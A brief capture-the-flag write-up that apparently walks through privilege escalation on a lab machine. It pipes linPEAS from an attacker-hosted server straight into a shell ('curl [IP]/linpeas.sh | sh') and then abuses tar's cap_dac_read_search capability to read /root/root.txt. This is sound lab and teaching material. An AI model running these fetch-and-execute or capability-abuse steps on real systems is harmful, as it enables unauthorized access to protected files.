[< Back](../../README.md)

Now that we have access to the machine, we can try to look around.

We don't have the user password so no `sudo -l` for us. I will now use linPEASS to try to find a vulnerability.

Using one of the basic examples they give, we set up a local server and execute the script on the machine.

```sh
sudo python -m SimpleHTTPServer 80 # Host
curl [IP]/linpeas.sh | sh          # Victim
```
After looking in details at the output, and testing about ten potential CVE's, I found something interesing with file capabilities.
```
Files with capabilities (limited to 50):
/usr/bin/mtr-packet = cap_net_raw+ep
/bin/tar = cap_dac_read_search+ep
```

So the program /bin/tar has the capability of reading files, we might be able to exploit this in our favor, let's try to make a tar ball out of /root/root.txt

```sh
❯ tar -cf /tmp/root.tar /root/root.txt
❯ tar xf root.tar
❯ cat root/root.txt
```

And we get the flag
